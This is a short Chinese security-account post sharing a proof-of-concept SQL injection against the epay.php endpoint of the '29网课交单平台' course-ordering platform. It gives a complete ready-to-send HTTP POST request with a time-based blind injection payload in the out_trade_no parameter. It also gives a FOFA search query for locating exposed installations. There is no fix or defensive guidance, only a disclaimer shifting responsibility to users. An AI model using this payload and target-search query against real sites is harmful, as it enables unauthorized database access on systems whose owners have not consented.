#  29网课交单平台 epay.php SQL注入漏洞   
小白菜安全  小白菜安全   2024-06-16 21:42  
  
**免责声明**  
  
该公众号主要是分享互联网上公开的一些漏洞poc和工具，  
利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，本公众号及作者不为此承担任何责任，一旦造成后果请自行承担！如果本公众号分享导致的侵权行为请告知，我们会立即删除并道歉。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia1Au88bO1jFd8V3AmqMvsqEZUFalBicQwJaic1tesic3duRuGPPQ3E1vczEJ67UzoMicSWMZpKwRElxtA/640?wx_fmt=png "")  
  
**漏洞影响范围**  
  
无  
#  漏洞复现  
  
**poc**  
```
延时注入8秒
POST /epay/epay.php HTTP/1.1
Host:
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 68

out_trade_no=' AND (SELECT 1 FROM (SELECT(SLEEP(4)))eEcA) AND '1'='1
```  
  
出现如下数据表示漏洞存在  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia33YZXkt0LyEkJibesw5JicJickkLfkgdBWxNgYFT7bEVFft3F4sF7v71NpdrpoUTobsO85FWsiaDJSkA/640?wx_fmt=png&from=appmsg "")  
# 搜索语法  
  
**fofa:fofa:body="/apisub.php"**  
  
